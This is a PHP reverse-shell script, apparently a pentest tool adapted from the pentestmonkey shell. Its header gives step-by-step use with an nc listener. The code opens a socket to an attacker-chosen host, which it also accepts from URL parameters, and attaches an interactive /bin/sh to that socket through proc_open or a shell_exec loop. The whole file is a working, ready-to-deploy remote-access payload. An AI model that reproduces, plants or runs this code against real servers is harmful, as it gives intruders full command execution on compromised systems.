<?php
/**
 * reverse-shell.php — connect-back shell.  Authorised targets only.
 *
 * 1. Set LHOST/LPORT below (or pass ?lhost=..&lport=.. when you browse it).
 * 2. Start a listener on your box:   rlwrap nc -lvnp 443
 * 3. Browse to http://target/reverse-shell.php
 *
 * Based on the classic pentestmonkey php-reverse-shell, trimmed. If PHP's
 * networking funcs are disabled, use one of the payloads in
 * ../notes/reverse-shells.md instead.
 */
set_time_limit(0);
$ip   = $_GET['lhost'] ?? '10.10.14.1';   // <-- CHANGE ME (your IP)
$port = (int)($_GET['lport'] ?? 443);      // <-- CHANGE ME (your listener port)

$sock = @fsockopen($ip, $port, $errno, $errstr, 30);
if (!$sock) { http_response_code(200); die(); }

$shell = 'uname -a; id; /bin/sh -i';
if (function_exists('proc_open')) {
    $desc = [0 => $sock, 1 => $sock, 2 => $sock];
    $proc = proc_open($shell, $desc, $pipes);
    if (is_resource($proc)) { while (proc_get_status($proc)['running']) usleep(50000); proc_close($proc); }
} elseif (function_exists('shell_exec')) {
    // fall back: pump the socket by hand
    fwrite($sock, shell_exec($shell));
    while (($line = fgets($sock)) !== false) fwrite($sock, shell_exec(trim($line) . ' 2>&1'));
}
fclose($sock);
